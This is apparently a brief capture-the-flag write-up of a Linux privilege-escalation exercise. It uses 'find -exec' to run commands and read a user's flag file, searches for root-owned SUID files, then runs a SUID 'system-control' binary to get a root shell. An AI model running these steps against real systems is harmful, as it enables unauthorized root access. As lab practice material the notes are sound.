find test -exec whoami \;
find gives igor exec privileges so
find test -exec cat /home/igor/flag1.txt \;
will give the first flag

Using
find / -user root -perm -4000 -exec ls -ldb {} \; > test
gives all files with uid set bits for root, outputing to test removes the permission denied parts

saw this:
-rwsrwxr-x 1 root root 8880 Dec  7 21:17 /usr/bin/system-control
an awful lot of privileges

Used:
find test  -exec /usr/bin/system-control \;
then recieved:
===== System Control Binary =====

Enter system command: bash
once entered opened a shell with root privileges
simply cat the flag file
